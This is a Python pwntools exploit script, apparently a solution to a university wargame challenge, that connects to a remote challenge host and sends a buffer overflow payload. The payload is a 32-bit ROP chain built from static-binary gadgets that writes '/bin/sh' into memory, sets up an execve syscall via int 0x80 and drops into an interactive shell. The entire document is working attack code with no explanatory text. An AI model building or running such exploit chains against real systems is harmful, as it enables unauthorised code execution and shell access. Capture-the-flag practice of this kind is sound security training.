#!/usr/bin/python

from pwn import *
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # static
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

#c = process("./binaries/static")
c = remote("wargames.6447.sec.edu.au", 8004)
#c = gdb.debug("./binaries/static")

offset = 12

rop = 'a'*offset

rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret;
rop += '//bi'
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret;
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0005254d) # 0x0809a54d: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret;
rop += 'n/sh'
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret;
rop += rebase_0(0x000a3064)
rop += rebase_0(0x0005254d) # 0x0809a54d: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret;
rop += p(0x00000000)
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret;
rop += rebase_0(0x000a3068)
rop += rebase_0(0x0005254d) # 0x0809a54d: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret;
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0009ef54) # 0x080e6f54: pop ecx; push cs; or al, 0x41; ret;
rop += rebase_0(0x000a3068)
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret;
rop += rebase_0(0x000a3068)
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret;
rop += p(0x0000000b)
rop += rebase_0(0x000271a0) # 0x0806f1a0: int 0x80; ret;

c.sendline(rop)

c.interactive()
